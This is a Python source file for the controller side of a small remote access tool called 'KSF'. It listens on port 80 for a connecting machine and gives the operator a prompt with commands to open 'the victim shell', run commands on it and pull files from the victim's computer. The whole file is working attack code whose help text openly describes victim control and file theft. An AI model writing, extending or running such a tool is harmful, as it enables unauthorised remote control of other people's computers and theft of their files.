# -*- coding: utf-8 -*-

import socket
import os
from time import sleep

IP = socket.gethostbyname("localhost")
PORT = 80

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((IP, PORT))

s.listen(10)

conn, cliente = s.accept()

welcome = conn.recv(1024)
print(welcome.decode("utf-8"))

class Shell:
	def __init__(self, SHELL_BT):
		self.SHELL_BT = SHELL_BT

	def verifications(SHELL_BT):
		verifications = ["shell", "exit", "recv archive", "help"]

		if(SHELL_BT == verifications[0]):
			while True:
				shell = Shell.command()
				if shell == "exit":
					break

		if(SHELL_BT == verifications[1]):
			conn.send("exit".encode())
			conn.close()
			s.close()
			exit()

		if(verifications[2] in SHELL_BT):
			Shell.recv_archive(SHELL_BT)

		if(not SHELL_BT in verifications):
			if(verifications[2] in SHELL_BT):
				return(" ")

			os.system(SHELL_BT)
			print("\n")

		if(SHELL_BT == verifications[3]):
			print("\033[1;32mversion 0.1\n\nCommands:\n\nhelp			Print this message helper\nshell			Opens the victim shell\nrecv archive		Chose an archive of victim and recv to your computer\nexit		Exit the program\n\n\nUsage Method:\n\nrecv archive		recv archive <filename_client> <filename_server>\n\n\n\033[0;0m")

	def home():
		conn.send("home".encode())
		HOME = conn.recv(1024).decode("utf-8")

		return(HOME)

	def command():
		HOME = Shell.home()
		SHELL = str(input("%s>> "%(HOME)))
		if(SHELL == "exit"):
			SHELL = ""
			return("exit")

		conn.send("command".encode())
		sleep(1)
		conn.send(SHELL.encode())
		print(conn.recv(1024).decode("utf-8"))

	def recv_archive(filenames):
		filename = filenames[13:]
		num_f = 0

		filename_client = ""
		for i in range(len(filename)):
			if(filename[num_f] != " "):
				filename_client += filename[num_f]
				num_f += 1

		filename_server = filename[num_f+1:]
		conn.send("filesend".encode())
		sleep(1)

		conn.send(filename_client.encode())
		sleep(1)

		#filesize = conn.recv(1024)
		#sleep(1)

		filebyte = conn.recv(1024)
		print(filebyte)

		with open(filename_server, "wb") as infile:
			#infile.write(filesize)
			infile.write(filebyte)

while True:
	try:
		shell_btnt = str(input("\033[31m\033[1mKSF\033[31m>>\033[1;32m "))
		Shell.verifications(shell_btnt)

	except KeyboardInterrupt:
		conn.close()
		s.close()
		exit()
